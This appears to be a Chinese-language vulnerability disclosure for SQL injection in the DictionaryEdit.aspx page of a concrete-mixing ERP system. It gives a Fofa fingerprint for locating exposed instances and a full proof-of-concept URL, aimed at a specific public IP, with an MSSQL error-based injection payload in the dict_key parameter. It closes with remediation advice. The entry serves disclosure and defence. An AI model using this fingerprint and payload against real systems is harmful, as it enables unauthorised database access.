# 商混ERP系统DictionaryEdit.aspx页面存在SQL注入

- **系统**：商混ERP系统DictionaryEdit.aspx页面　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="商混ERP系统"`

**请求体 / payload**
```
1. Fofa
title="商混ERP系统"
1. 部分界面如下
3、隐患url,复现如下
[http://122.234.96.142:8001/Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27)),3,32))--](http://122.234.96.142:8001/Sys/DictionaryEdit.aspx?dict_key=1%2527%2520and%25201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes(%2527MD5%2527,%2527123456%2527)),3,32))--)
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。